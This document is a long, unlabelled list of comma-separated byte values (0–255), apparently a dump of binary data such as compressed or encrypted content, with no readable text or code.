233,24,172,229,26,61,1,186,169,137,51,58,59,75,32,168,16,196,144,34,131,114,169,14,225,81,222,60,31,89,206,151,67,38,125,102,168,8,241,26,154,5,196,105,50,24,103,120,132,56,102,194,154,240,223,221,5,200,29,40,131,203,83,201,123,102,195,169,1,216,22,37,121,118,140,20,173,198,181,207,39,228,183,39,223,234,15,156,39,197,190,51,20,115,85,237,254,20,182,189,135,28,39,38,103,67,183,212,216,44,61,31,120,139,80,12,183,137,1,227,24,164,11,190,136,81,217,81,221,33,103,207,72,246,247,17,192,149,25,157,252,226,47,89,199,124,97,194,182,200,130,229,254,180,146,54,35,167,255,226,26,99,81,169,220,227,213,141,231,31,172,166,217,123,124,71,233,160,195,28,117,2,170,136,212,207,181,184,220,90,219,112,161,5,250,23,162,31,164,250,21,190,174,249,83,216,91,227,75,2,230,2,102,124,59,253,246,228,99,202,129,59,254,129,25,139,213,255,1,107,168,245,203,106,199,127,238,34,149,230,78,134,86,234,251,16,67,37,131,62,5,167,108,144,3,184,80,125,56,7,154,32,101,223,86,220,43,47,238,210,98,80,142,98,104,156,55,56,231,47,117,31,109,191,122,96,187,205,128,84,219,86,211,94,189,193,189,156,255,217,93,236,42,97,72,213,47,34,136,44,137,88,216,55,10,92,136,62,188,75,43,16,167,23,137,202,138,68,34,81,245,237,64,47,9,62,169,82,92,114,121,93,245,146,160,169,57,194,103,122,64,44,65,75,17,172,186,131,242,197,138,218,242,49,235,2,226,37,125,51,51,109,165,165,145,44,249,2,7,219,98,223,47,219,155,25,108,40,243,213,49,28,152,211,25,155,214,112,119,0,113,25,42,11,36,152,253,22,176,207,82,185,79,176,200,30,36,103,129,76,244,33,171,13,213,105,155,2,225,90,1,11,220,90,197,130,78,251,10,205,142,8,85,176,158,213,112,119,162,234,222,165,80,50,17,43,170,8,172,9,216,87,186,130,245,187,165,136,229,35,133,5,73,137,178,60,210,86,196,174,43,184,20,14,66,143,37,72,5,250,12,177,195,157,254,223,61,55,44,81,224,24,145,70,49,106,202,159,251,227,61,66,60,74,42,127,86,209,64,241,248,243,139,181,154,20,163,207,79,165,4,200,164,239,253,253,226,68,203,141,31,147,234,84,223,167,121,144,33,222,164,111,223,105,128,83,128,234,2,197,156,213,52,209,60,249,194,180,198,140,19,132,7,215,15,70,20,177,85,105,74,148,137,49,115,148,255,213,251,123,80,221,85,163,6,173,215,246,11,123,30,163,248,155,231,213,98,120,68,86,102,165,236,221,211,98,211,132,66,152,6,195,140,222,107,121,83,98,123,245,234,163,200,46,227,163,55,43,119,163,22,160,25,191,178,206,140,78,8,204,151,72,35,121,142,95,33,109,157,32,168,12,192,172,205,98,201,99,179,99,197,75,174,245,2,125,66,196,148,227,246,37,23,152,37,81,173,28,22,150,27,78,127,95,219,107,139,189,153,11,181,100,219,43,61,163,185,59,24,24,102,82,119,232,104,158,52,102,177,224,93,234,36,135,96,214,98,205,146,149,19,171,246,29,173,222,84,204,88,221,65,41,63,21,57,191,130,71,23,100,136,214,46,37,62,51,252,142,53,219,91,252,253,252,18,150,164,51,56,249,15,41,79,1,239,16,146,198,121,154,32,53,213,103,181,71,144,211,251,61,180,147,246,205,133,6,111,145,200,149,77,9,218,119,103,50,138,51,8,241,173,190,176,187,188,117,107,195,164,169,121,122,124,242,145,209,255,49,218,31,81,187,188,98,92,204,24,163,37,130,111,184,164,124,174,202,68,50,213,91,162,218,75,225,215,72,46,98,110,42,103,183,65,162,158,153,120,164,248,30,163,248,239,177,90,159,208,62,60,27,47,96,155,1,116,14,149,14,196,86,237,248,243,161,11,116,14,153,37,98,129,239,18,127,194,13,121,80,224,215,228,18,150,41,100,57,86,239,254,208,17,57,3,164,194,106,113,91,158,20,88,121,115,35,130,135,90,229,85,204,3,17,140,56,24,142,68,229,76,90,101,183,152,17,75,235,68,6,45,237,31,97,183,102,244,1,208,74,39,32,9,168,249,231,243,153,19,122,209,224,254,192,146,194,36,84,209,121,115,23,140,28,164,17,185,202,116,144,7,160,136,76,163,136,37,85,149,35,93,37,67,163,198,94,149,238,228,2,169,241,194,59,44,246,9,243,24,173,255,207,250,62,49,36,37,138,184,162,8,218,78,216,244,238,60,57,232,201,132,240,27,189,186,198,179,179,77,50,42,93,169,218,95,112,29,88,167,187,195,128,102,185,59,186,128,47,34,71,216,38,61,54,241,173,216,242,22,203,143,73,44,73,141,132,96,153,199,164,106,140,75,19,166,209,10,174,251,11,194,144,204,10,145,250,192,180,174,211,235,170,176,158,211,116,55,220,75,154,32,175,228,71,47,62,172,40,115,95,117,159,141,50,29,106,155,241,167,214,130,103,96,97,187,73,16,220,91,227,94,178,80,61,54,23,75,23,15,155,28,157,7,173,117,172,225,97,216,89,202,29,90,191,160,132,203,88,217,84,188,138,243,27,131,113,135,54,81,230,55,244,18,144,51,188,66,128,228,229,135,115,78,230,1,106,114,90,161,10,156,239,122,239,241,180,220,71,139,99,107,64,66,23,128,24,124,228,62,24,166,162,132,54,80,234,209,51,154,161,247,140,12,173,230,4,205,115,166,221,4,233,52,247,53,39,135,92,199,166,194,111,32,77,199,89,227,16,148,140,184,150,197,170,221,203,165,215,71,76,233,28,226,95,52,234,237,11,203,51,228,47,225,200,30,153,254,135,60,58,10,187,168,8,182,121,138,81,162,51,45,121,143,21,35,77,214,4,168,115,84,177,155,29,100,150,132,209,77,161,20,158,136,108,129,93,82,238,204,168,100,59,144,161,138,166,225,75,216,91,178,45,219,64,200,25,248,235,44,53,59,39,138,50,4,233,52,247,70,37,115,105,133,245,213,237,233,245,208,124,69,244,106,31,98,98,211,98,58,87,178,142,123,84,250,27,175,0,202,1,95,180,208,35,11,159,159,168,63,51,223,213,4,73,246,10,153,13,179,230,28,70,34,136,251,40,66,15,147,193,138,36,45,45,229,0,174,165,253,195,121,219,203,94,110,175,205,251,21,121,129,119,59,203,98,120,97,160,113,38,15,253,221,88,188,210,87,133,59,205,51,195,126,122,103,255,213,110,109,146,36,146,24,84,248,7,128,156,235,3,189,148,32,34,76,137,20,113,91,219,41,71,114,8,167,147,63,30,7,239,249,20,113,79,227,42,6,218,228,2,4,211,171,208,126,74,2,80,91,92,170,94,104,181,195,93,107,45,153,7,217,45,83,224,94,181,123,130,106,86,22,133,115,161,7,214,82,212,70,226,197,95,146,248,6,168,203,229,175,179,112,170,221,202,168,155,134,217,223,189,64,224,250,228,66,253,230,192,135,6,222,73,21,142,197,29,17,10,181,207,75,248,242,42,83,164,10,210,30,207,128,114,164,228,43,16,166,252,191,119,6,157,215,40,117,91,177,52,192,128,9,221,69,148,74,230,88,191,64,251,135,83,202,228,37,126,73,43,72,147,235,35,106,125,83,179,34,107,171,181,185,174,247,235,217,106,179,124,179,197,117,146,217,39,248,198,91,156,38,110,147,255,192,81,250,203,99,58,120,194,113,71,23,62,137,48,116,144,227,186,124,119,138,34,46,73,143,53,91,177,243,223,59,39,139,47,14,203,144,230,123,122,85,236,4,197,99,137,209,60,249,194,167,208,122,246,116,10,160,87,71,137,214,92,23,200,56,45,131,32,106,200,150,244,231,173,30,206,77,179,211,9,19,52,18,119,74,17,148,47,214,211,239,244,91,58,176,96,191,237,52,186,133,50,63,25,169,246,26,143,240,150,37,113,154,233,45,69,55,72,187,39,237,132,199,49,57,29,181,94,100,63,78,130,40,55,8,213,71,21,38,227,190,132,171,76,123,1,220,151,72,182,178,243,244,139,71,11,203,86,230,25,185,139,101,135,46,217,154,93,162,181,206,23,0,204,191,200,150,249,212,224,4,91,184,57,4,121,4,65,94,189,208,139,70,50,101,186,212,115,142,92,240,27,179,206,153,55,68,57,82,239,46,102,180,228,152,9,202,154,36,120,133,68,255,243,230,42,251,224,199,147,40,116,90,230,107,145,66,35,93,85,72,69,254,226,101,211,91,199,156,0,214,84,253,7,188,161,239,232,22,156,48,97,178,194,164,233,28,136,107,187,160,241,0,224,78,253,246,241,228,35,112,167,255,216,84,251,226,48,71,19,153,8,190,175,247,8,231,20,193,170,165,253,157,130,220,183,45,255,208,87,8,86,82,149,117,13,136,22,108,170,151,187,173,115,146,88,233,56,93,179,78,65,40,65,218,148,173,209,105,100,62,35,144,76,232,167,219,70,5,153,182,129,225,47,56,83,181,229,10,160,123,50,209,87,91,158,171,107,11,0,209,135,121,148,39,127,116,153,26,168,254,250,247,17,198,180,200,160,44,130,93,221,88,226,63,55,74,14,187,196,167,3,220,97,208,205,105,167,252,254,250,244,13,171,215,135,249,234,77,194,133,118,139,24,125,238,92,20,124,38,123,17,252,121,69,225,13,199,112,161,192,209,107,4,97,218,67,119,217,210,180,234,249,237,18,201,115,66,45,105,90,30,147,12,200,111,131,42,52,208,62,244,211,117,99,181,73,230,46,88,190,58,248,76,236,240,225,39,102,49,23,128,100,43,244,106,39,28,226,98,127,81,192,21,122,115,132,43,60,221,92,193,184,178,181,214,87,228,237,39,37,253,112,50,48,169,8,204,116,119,141,187,158,218,223,18,121,66,39,67,17,167,9,179,131,108,171,148,114,151,255,238,254,215,37,92,240,229,86,182,182,182,221,56,243,27,159,182,9,209,80,251,216,73,207,95,6,243,20,125,69,140,255,104,145,172,171,131,228,161,62,23,184,47,68,24,182,220,82,248,233,14,198,111,144,201,146,4,178,67,218,217,61,168,182,100,66,135,141,42,118,151,124,92,207,141,99,194,159,16,152,53,77,188,186,140,24,19,106,41,77,122,66,191,48,189,233,24,184,34,108,160,23,183,216,92,215,48,221,23,106,111,159,231,45,208,7,47,213,17,5,250,183,170,182,142,33,121,249,109,102,100,86,255,225,34,52,41,221,86,5,119,141,90,222,6,87,252,12,214,103,118,163,121,112,125,74,204,187,52,77,255,223,35,97,144,93,190,195,148,16,194,145,54,253,216,65,42,58,44,84,3,198,74,24,168,156,69,244,30,151,24,179,144,26,182,217,92,221,20,176,168,227,49,107,141,243,26,161,176,10,166,7,218,78,16,121,130,63,36,234,186,24,27,64,120,161,196,131,65,47,62,33,31,85,172,193,138,131,69,10,25,187,30,43,44,130,255,242,41,114,74,139,97,221,100,190,111,183,62,33,105,134,22,221,208,120,125,102,142,33,79,32,116,158,2,197,164,237,34,58,34,100,193,116,124,100,212,84,158,26,160,180,252,210,140,85,194,27,100,144,204,104,207,145,53,79,189,183,148,30,126,133,64,220,95,211,28,196,121,149,59,17,47,40,69,174,227,28,141,175,105,11,67,200,223,107,101,159,235,51,50,69,181,149,237,253,244,137,186,57,21,246,106,33,13,184,3,252,143,68,53,78,183,69,50,105,189,177,149,69,149,29,116,101,122,178,80,248,254,228,19,146,252,17,105,50,211,9,171,57,90,216,81,225,80,116,89,162,224,64,170,228,232,84,96,72,106,19,50,176,246,161,14,214,105,100,61,73,35,143,61,243,43,228,49,58,19,111,210,239,28,146,39,76,232,249,33,114,166,235,11,210,98,194,90,194,132,97,147,31,123,141,40,37,134,92,129,170,250,244,229,17,70,249,25,178,209,123,56,69,231,35,112,175,193,88,238,38,34,198,166,241,240,241,168,244,233,38,227,204,225,192,81,68,62,237,9,175,229,28,137,233,249,191,121,57,121,89,236,71,46,132,61,167,111,184,92,219,110,162,186,58,82,8,225,70,215,128,226,52,49,47,28,204,2,227,62,36,84,207,68,63,25,177,199,118,144,40,112,80,224,41,114,97,183,180,226,42,31,153,37,36,173,180,188,141,208,92,174,134,56,94,227,61,55,4,226,18,164,238,54,45,20,184,198,66,83,194,145,14,78,225,31,49,89,187,177,66,177,51,203,46,174,0,166,221,51,89,192,157,172,176,155,230,56,84,165,141,29,71,245,230,157,160,160,75,37,22,173,248,4,148,173,249,19,193,165,186,214,225,58,32,100,126,164,123,121,124,105,134,58,6,252,227,83,226,38,129,85,236,221,56,35,133,39,100,174,244,244,191,182,205,45,148,3,185,155,251,235,187,156,50,101,183,202,75,12,147,32,122,146,24,83,251,255,153,82,201,104,140,39,104,67,36,88,217,202,23,0,101,98,16,218,26,130,66,44,70,9,104,122,233,253,233,34,82,198,63,55,48,106,157,246,18,162,4,141,70,201,6,31,164,119,87,120,45,85,189,55,229,27,240,0,180,79,193,108,107,186,178,199,100,146,220,90,174,233,58,242,164,248,109,68,22,98,0,204,160,12,147,8,117,85,9,90,172,46,143,3,194,181,64,8,172,225,17,151,41,85,144,187,125,54,12,213,98,185,141,22,80,254,192,162,197,17,90,27,66,64,147,223,28,40,252,215,129,105,128,114,157,200,33,130,208,28,144,246,68,35,86,217,239,32,91,225,82,170,123,115,251,153,25,90,49,144,186,170,221,10,76,247,18,198,122,241,253,222,61,242,171,161,129,81,210,134,30,171,186,142,175,148,170,204,253,183,95,80,93,10,180,227,81,247,36,126,112,186,196,159,39,116,143,93,221,83,18,193,168,21,197,155,53,166,223,71,35,149,70,19,178,187,130,231,248,199,89,238,23,153,236,249,166,252,208,108,37,67,125,157,171,61,19,204,137,31,149,54,253,131,91,69,190,170,167,49,91,174,211,2,231,4,228,71,202,28,146,160,170,230,245,98,251,119,113,136,8,80,236,51,97,169,100,162,238,12,94,234,252,203,250,180,75,233,165,193,66,168,83,40,87,236,48,102,177,228,90,248,252,3,246,10,197,166,15,217,87,240,48,97,192,183,221,94,202,151,60,75,2,239,46,101,180,216,111,168,235,53,97,208,116,153,52,88,219,101,215,125,108,176,231,59,50,93,232,78,250,7,238,49,80,5,246,114,123,117,157,26,149,42,85,182,76,203,76,202,154,3,120,132,46,89,160,125,21,234,213,134,191,90,171,125,254,246,221,69,171,235,2,214,230,255,73,58,212,194,187,192,140,39,12,73,212,51,20,115,86,172,170,240,233,40,51,197,61,113,65,66,141,240,233,196,67,96,101,193,177,157,194,94,236,254,225,196,101,22,210,13,38,149,206,132,100,179,220,70,24,88,172,105,116,82,185,132,36,68,228,66,244,8,146,168,149,106,86,6,65,210,66,184,89,239,153,53,90,191,85,240,26,120,136,229,30,173,252,7,227,73,139,203,77,199,90,230,24,148,168,186,159,0,100,42,57,54,61,2,183,108,175,199,165,236,9,217,76,6,136,86,145,160,159,243,157,171,118,55,170,123,85,129,71,167,218,36,0,176,159,209,123,71,4,206,149,17,103,191,177,128,152,254,7,229,60,55,47,62,0,202,167,8,208,128,41,113,101,171,216,120,105,98,207,130,14,239,249,22,182,200,146,30,111,85,109,103,121,67,47,65,188,201,140,75,202,143,10,188,166,13,168,162,13,201,58,106,136,104,193,167,245,245,235,248,26,165,220,54,247,10,126,232,119,157,141,24,55,240,12,152,166,151,5,50,56,32,146,22,155,148,177,156,218,32,141,29,139,181,88,62,170,146,128,137,10,176,164,197,123,108,33,244,206,92,234,237,218,68,6,113,152,169,181,235,30,202,168,141,74,36,129,28,22,190,195,175,220,22,195,25,143,31,102,119,185,59,57,58,47,51,50,30,173,143,168,135,61,192,68,170,156,125,5,185,88,196,49,33,72,188,38,251,121,240,167,171,156,50,237,42,130,101,112,25,181,223,91,217,31,167,112,141,38,79,187,238,155,24,158,3,184,164,197,189,158,34,119,103,190,158,14,118,110,128,109,111,139,55,89,196,81,2,232,221,147,53,82,1,203,117,48,68,36,62,16,212,128,102,188,118,139,21,154,13,217,68,208,133,96,117,201,147,56,80,222,60,218,71,26,93,214,68,23,18,65,129,224,241,101,219,20,146,20,184,163,244,169,186,126,75,42,73,163,210,1,228,22,2,254,137,85,1,233,228,190,198,171,249,254,175,248,123,106,143,22,103,234,167,243,14,180,163,226,11,235,19,194,150,9,216,80,250,178,184,162,9,158,0,216,119,107,92,225,75,179,15,179,171,242,177,183,223,94,206,134,25,163,207,108,149,64,14,113,161,13,110,223,66,254,248,157,21,135,77,110,45,191,39,26,234,76,194,137,47,101,156,9,104,124,226,176,175,223,40,123,46,162,17,173,192,192,95,239,9,225,55,37,132,77,2,153,4,168,115,85,175,161,36,145,30,124,98,88,230,233,193,80,51,150,37,137,9,180,174,229,16,174,113,154,247,244,134,58,232,26,13,63,132,212,9,236,187,145,55,39,119,71,31,109,61,180,146,247,201,83,181,144,255,4,223,39,126,37,193,177,167,231,253,216,83,10,234,49,101,200,127,88,226,92,246,16,200,151,12,173,171,107,108,107,109,102,123,61,246,10,167,237,142,204,227,187,95,27,185,123,95,150,171,172,170,175,229,27,139,195,105,144,45,253,189,32,79,220,242,151,234,239,224,91,209,107,120,87,143,65,209,251,187,75,223,70,10,212,82,175,21,147,52,30,135,20,30,74,40,68,142,41,65,217,47,70,27,102,112,223,76,1,207,44,43,46,124,106,71,194,38,60,251,189,181,156,249,133,214,197,47,108,97,79,175,150,85,150,175,173,103,91,248,5,100,102,186,92,196,187,120,211,32,2,118,177,206,255,214,121,78,94,80,213,214,137,59,75,251,217,105,158,15,115,173,189,178,113,135,14,160,218,74,11,117,85,111,98,136,23,104,117,78,196,172,204,27,155,244,14,92,197,83,210,67,16,184,114,185,119,137,53,45,241,22,178,235,30,74,45,94,101,157,75,37,100,63,50,101,116,179,136,83,214,76,146,51,90,242,8,139,103,174,128,134,243,23,189,183,123,247,27,173,241,22,103,172,250,0,163,4,185,191,75,250,180,174,175,204,133,12,233,228,63,17,153,172,230,66,58,49,18,212,102,74,236,93,238,8,84,241,38,48,125,40,115,118,107,53,73,26,180,194,94,240,19,83,19,97,204,140,26,55,92,222,49,57,215,232,247,202,81,186,128,47,34,73,210,55,10,208,36,3,165,143,20,168,229,67,4,154,84,213,110,113,141,0,91,148,73,225,184,169,192,93,162,236,62,65,40,76,21,148,187,182,208,146,245,235,68,53,93,225,79,157,251,252,198,122,0,99,32,32,154,214,238,211,43,137,243,20,180,193,177,196,158,203,112,156,240,26,57,48,19,146,4,205,129,22,198,59,62,55,57,72,255,236,189,52,19,117,78,197,96,143,0,175,162,200,86,236,0,233,204,118,65,7,165,233,46,17,201,6,182,157,9,172,188,95,2,97,199,144,44,60,24,106,205,110,178,196,127,118,118,137,7,188,128,235,238,229,0,174,165,192,112,96,144,255,177,156,218,32,80,8,183,93,215,63,44,3,208,51,49,38,103,179,128,141,248,5,193,138,219,89,233,69,13,116,142,27,158,163,227,122,150,17,56,70,42,38,155,207,126,85,207,11,199,157,41,97,119,134,53,81,151,57,194,151,180,229,66,4,191,90,224,244,145,248,148,3,218,79,5,189,111,204,104,205,142,24,117,135,87,121,135,54,57,184,67,229,255,178,152,231,250,193,108,105,115,86,242,246,249,151,239,160,206,69,225,13,136,22,108,175,190,162,125,244,210,57,2,236,7,199,46,41,242,215,40,55,72,194,23,34,162,246,116,83,249,159,116,188,97,92,239,25,112,75,29,129,76,160,204,216,59,46,196,29,178,191,2,134,62,144,94,72,86,10,184,210,102,154,36,107,167,172,2,192,158,104,47,213,33,107,139,21,181,122,25,104,51,21,110,99,134,28,89,164,12,172,123,125,30,20,112,45,56,60,42,116,114,80,39,121,85,222,225,21,199,112,142,150,164,117,65,13,166,195,169,157,181,238,213,109,137,49,228,60,63,70,14,123,153,23,57,33,192,197,133,221,88,244,201,179,135,88,199,120,17,182,209,144,47,21,202,134,248,30,42,113,173,229,250,150,46,108,135,69,254,244,207,143,63,231,55,32,125,202,10,69,208,95,175,170,247,180,111,192,95,207,99,165,136,79,5,241,10,133,124,112,44,72,76,34,108,38,122,139,2,6,143,63,17,153,172,227,73,38,108,94,239,24,68,64,218,99,199,107,78,224,97,207,93,179,104,52,18,121,67,230,253,184,135,24,102,125,56,83,231,40,65,251,161,16,76,233,75,12,161,250,83,110,23,90,193,138,23,173,145,216,128,13,200,151,23,175,203,136,1,184,173,231,3,154,98,193,160,244,190,117,80,22,156,175,138,207,65,235,237,232,246,203,78,198,94,149,238,35,82,215,234,165,89,115,160,194,44,26,84,11,107,174,231,41,121,110,159,187,154,54,65,174,90,201,77,11,4,209,96,154,56,18,170,171,91,149,69,238,145,31,95,128,58,98,63,78,161,213,62,28,54,49,91,171,225,5,77,189,205,84,94,185,146,229,11,239,152,63,195,125,93,212,85,171,184,169,249,159,52,197,132,98,149,34,67,147,238,61,7,70,0,189,101,140,111,27,186,94,159,223,58,220,61,55,21,161,197,12,128,133,44,215,78,210,40,69,67,157,47,244,233,24,164,229,252,198,124,126,14,232,172,176,92,154,223,17,124,59,253,182,208,90,205,253,119,74,207,66,47,63,30,40,58,2,197,140,193,19,113,99,190,191,127,217,245,193,3,232,74,153,30,154,51,52,189,142,25,116,85,31,8,209,115,133,49,57,8,245,247,21,156,248,12,181,201,68,58,22,186,168,16,217,103,202,67,127,226,44,104,138,75,161,200,141,11,90,191,136,80,231,164,158,217,225,12,138,16,200,120,24,180,202,144,251,253,162,150,207,181,13,190,189,108,139,40,134,91,146,56,29,148,198,89,219,34,23,137,41,108,148,159,162,24,166,177,217,43,103,198,108,19,72,201,235,58,116,12,173,202,18,169,209,140,72,232,245,177,194,195,132,216,108,121,101,155,49,95,175,189,97,222,79,229,80,15,196,77,13,165,239,152,164,195,100,129,115,118,31,145,15,206,107,198,181,209,140,254,77,122,149,181,185,179,79,243,229,207,95,6,243,21,121,112,142,106,172,99,49,245,208,1,234,146,78,9,175,190,73,144,255,177,154,224,14,131,37,125,65,23,148,69,2,150,49,91,131,143,23,181,209,106,190,111,126,139,92,213,113,87,232,254,223,61,73,244,190,185,195,74,59,21,188,187,172,249,170,109,102,123,60,250,191,114,88,228,24,154,135,224,165,116,51,158,49,20,147,251,124,58,1,171,243,239,24,163,220,58,210,119,95,223,57,92,244,22,188,109,2,92,240,163,236,25,28,139,31,34,103,238,59,60,3,207,74,157,126,11,168,121,108,194,166,249,4,123,144,65,9,176,114,23,105,115,86,173,167,185,130,102,105,49,211,8,174,47,118,131,81,224,82,107,143,6,89,164,196,100,200,112,149,46,62,22,61,54,33,154,6,245,41,117,159,195,0,98,222,219,70,10,72,7,169,130,69,84,10,182,73,17,199,77,27,36,106,157,144,48,48,250,33,238,56,74,238,0,130,231,249,196,98,136,21,112,95,209,70,8,193,189,151,213,116,147,220,152,46,88,186,148,190,144,85,254,236,43,41,114,99,178,197,177,187,107,180,212,24,228,76,1,193,128,229,189,120,70,220,28,91,157,217,99,155,17,36,9,43,226,233,124,149,230,29,91,92,155,221,25,170,204,128,107,133,63,195,164,215,120,110,187,214,111,179,138,171,96,227,202,120,117,8,199,105,65,7,12,225,50,214,106,189,110,186,69,6,201,10,193,123,27,175,24,185,199,117,107,65,169,178,152,232,247,201,84,179,212,60,37,107,189,152,210,125,119,47,143,19,138,40,84,225,216,66,63,64,40,120,65,41,61,35,112,176,193,90,231,58,230,106,129,64,4,190,162,127,238,227,5,159,209,59,254,179,211,77,251,101,72,109,28,61,129,134,20,146,252,121,68,225,11,209,86,226,70,245,240,176,221,45,117,117,168,17,192,192,96,40,234,71,160,245,253,111,147,5,111,127,164,24,138,206,132,111,87,255,119,113,137,202,129,60,216,129,188,206,135,54,40,9,82,184,133,32,79,194,103,122,128,20,24,57,37,7,111,41,31,243,161,226,220,56,213,82,190,50,25,98,135,93,178,208,125,78,228,212,114,109,180,185,220,114,155,46,23,5,84,9,90,199,136,207,115,102,76,232,108,195,166,169,141,62,42,61,230,72,211,253,223,74,102,209,126,82,213,2,102,124,57,3,164,195,102,124,123,72,2,210,136,55,245,21,176,132,153,17,163,248,239,19,76,232,77,27,170,251,2,98,70,219,28,89,231,22,156,145,253,213,95,103,125,51,29,143,77,213,216,248,184,29,152,56,206,126,121,149,16,61,38,77,219,4,19,46,95,202,126,70,248,201,176,197,172,216,67,43,88,226,251,19,91,96,153,209,102,110,24,19,60,18,1,178,87,169,179,149,56,39,10,206,42,243,222,0,218,19,40,226,208,84,61,77,141,47,80,118,125,73,163,226,124,144,60,231,212,103,175,173,148,60,247,144,37,121,217,120,138,44,72,172,106,113,90,160,207,67,230,251,252,195,145,37,145,29,67,42,112,69,86,218,74,4,203,126,9,175,248,12,158,228,58,62,172,104,117,78,197,95,144,255,178,229,49,76,213,62,216,106,128,71,239,215,71,48,93,159,229,223,24,193,52,31,213,153,228,29,164,116,108,126,106,118,106,177,187,93,86,171,173,167,185,133,33,77,20,164,243,224,30,56,79,239,47,10,175,249,6,174,189,140,2,234,1,219,234,50,41,77,219,46,152,160,247,247,186,59,41,125,133,62,167,220,66,15,123,16,114,13,172,192,187,127,135,37,78,113,81,116,109,25,99,92,90,63,100,169,7,212,102,192,184,210,108,174,237,57,63,80,8,202,147,60,79,246,14,204,161,255,243,24,171,233,86,83,217,89,239,53,87,223,77,236,238,162,199,88,165,191,113,92,154,45,91,206,79,207,37,136,65,50,7,181,231,61,8,176,181,135,91,174,210,4,229,16,150,0,190,233,173,207,111,83,112,139,87,245,237,153,4,201,124,14,219,42,64,154,212,233,13,58,2,126,243,114,203,110,173,252,252,240,36,138,97,191,190,218,121,121,141,102,206,124,129,106,172,224,85,239,33,129,118,171,247,255,254,16,187,179,223,104,184,187,195,166,252,241,34,137,81,241,32,147,68,23,178,238,33,129,117,175,243,11,211,122,135,79,8,220,186,163,2,2,229,53,76,240,228,192,111,96,141,6,156,219,30,156,250,146,65,24,177,130,106,128,92,102,196,142,76,188,207,132,64,12,117,151,23,182,143,126,12,206,139,17,102,113,189,162,14,132,125,21,175,228,48,100,172,228,245,234,52,47,78,123,252,186,130,42,118,104,163,123,63,14,178,109,109,16,135,76,250,203,94,121,137,58,76,247,231,63,27,151,210,118,96,232,60,44,87,216,181,30,193,193,118,101,74,233,39,101,183,99,160,31,139,48,111,177,223,253,238,203,96,172,245,15,138,88,29,134,65,247,31,93,177,103,147,41,96,200,55,106,36,103,130,78,252,7,247,28,172,3,214,83,239,47,126,134,110,184,169,217,71,25,110,125,2,194,155,9,205,38,159,137,46,105,145,41,233,156,229,50,72,223,31,54,76,224,73,127,242,30,139,207,35,203,79,223,104,180,156,15,197,142,224,36,234,162,77,226,212,123,142,7,31,56,17,169,212,244,18,146,170,210,95,185,87,255,189,134,201,72,143,28,11,142,218,222,179,8,191,214,132,88,234,64,70,17,192,184,202,133,102,198,156,23,196,157,13,205,143,66,30,154,44,107,161,16,201,231,29,140,82,3,232,44,104,154,230,5,210,104,128,63,215,106,87,116,127,46,106,141,169,113,47,206,31,247,230,84,0,225,52,225,179,161,255,224,24,118,47,97,119,15,63,98,109,0,95,48,234,89,194,193,199,83,114,88,165,191,193,163,223,40,115,36,95,233,253,221,80,7,226,79,14,192,151,18,192,183,211,142,66,13,173,182,169,181,54,21,161,250,202,94,121,137,57,79,238,0,242,2,227,238,35,94,216,28,132,219,87,227,2,244,243,48,21,197,115,126,185,45,39,22,105,202,157,22,23,142,68,248,25,107,48,71,144,182,97,89,236,215,46,226,8,150,235,56,57,52,27,107,81,250,201,102,86,179,82,228,231,220,161,196,127,137,83,193,161,250,23,153,113,205,195,112,222,52,23,40,54,12,138,90,193,60,73,14,199,86,234,249,215,4,171,106,155,194,76,79,187,210,123,89,191,92,237,35,105,197,176,226,242,37,114,127,22,178,182,186,53,205,70,219,30,160,0,223,28,106,83,245,217,80,206,62,89,251,223,201,236,168,206,125,64,82,214,133,95,166,23,172,218,77,245,93,38,169,9,121,7,150,146,225,1,129,41,35,78,217,254,190,51,63,215,13,14,186,56,20,155,30,107,151,110,14,132,254,178,239,45,105,28,94,82,185,130,41,127,99,181,153,241,191,175,136,222,71,243,104,249,200,167,96,149,236,116,111,185,195,121,157,27,143,49,74,93,37,172,1,193,192,119,10,183,63,167,140,216,111,77,241,52,219,38,94,198,138,97,205,89,92,87,168,182,139,85,208,16,188,131,84,195,94,251,22,141,192,6,91,180,204,81,43,131,237,241,255,228,50,106,180,164,144,26,181,152,21,197,167,224,55,66,15,172,213,108,142,31,160,13,125,117,52,217,87,192,254,54,18,202,247,210,52,155,250,20,122,97,176,220,112,168,23,192,183,177,203,163,13,232,77,18,155,1,210,112,176,220,96,226,75,235,12,118,159,11,176,240,49,96,119,151,28,130,11,211,83,226,189,52,19,118,77,20,166,236,244,225,238,35,78,214,213,224,68,28,154,39,66,231,80,242,197,62,18,206,132,56,90,169,118,115,12,66,187,74,24,88,8,44,211,244,212,51,21,185,163,150,42,57,47,77,23,137,0,245,16,99,255,241,30,158,245,248,169,220,93,148,69,36,96,172,126,243,214,46,38,62,245,207,66,39,31,26,148,10,35,200,91,239,137,26,94,30,112,181,206,76,245,249,21,145,232,62,55,240,90,224,53,79,237,198,160,25,133,254,114,88,167,187,126,52,18,119,136,32,96,54,187,178,210,119,145,7,152,60,48,12,105,143,87,245,246,227,72,189,228,22,144,14,186,119,160,215,57,171,95,200,145,60,67,239,224,101,181,122,42,83,188,158,18,211,137,92,245,35,111,145,85,2,243,47,103,156,0,211,62,36,159,25,139,54,69,5,200,127,120,138,51,57,9,80,189,119,73,24,131,84,103,32,13,135,25,100,206,119,122,75,220,254,242,189,23,254,129,124,121,130,45,7,190,193,129,44,175,190,202,144,9,194,121,59,99,222,55,194,255,111,121,126,59,111,193,87,219,75,202,91,188,186,103,64,33,99,21,241,225,94,60,3,162,59,187,124,57,4,244,12,174,246,30,151,212,105,90,178,182,214,107,119,144,119,120,108,118,164,169,83,75,156,43,110,162,205,38,96,220,49,27,238,70,145,31,143,10,162,111,17,177,214,110,174,176,157,45,93,132,13,171,237,206,229,149,191,195,165,255,183,105,153,49,49,30,231,92,81,193,109,133,77,124,226,15,161,157,42,134,120,123,22,206,108,165,246,250,235,16,187,141,52,54,79,232,39,15,158,242,76,33,137,31,97,56,250,119,99,54,12,97,76,105,229,35,143,79,17,176,231,70,30,137,93,229,73,8,222,93,222,74,26,172,233,43,119,146,53,70,37,143,79,248,14,210,211,87,221,93,225,75,3,229,27,159,227,50,228,87,255,13,187,83,21,138,51,96,187,143,46,54,22,123,109,152,17,157,27,133,79,149,10,173,27,180,210,67,243,130,28,18,148,164,195,61,183,39,172,208,148,62,49,114,148,44,130,108,164,23,171,232,84,10,202,169,8,211,144,71,19,205,222,57,58,70,40,141,61,50,52,103,188,150,8,107,44,43,46,37,139,64,30,93,166,160,14,107,18,41,9,98,110,162,202,73,239,57,12,247,29,179,203,36,168,230,33,147,2,189,171,237,53,95,205,32,106,143,118,163,5,170,190,31,69,152,2,89,163,156,154,126,166,223,91,237,59,51,96,226,79,249,14,213,126,107,183,215,117,134,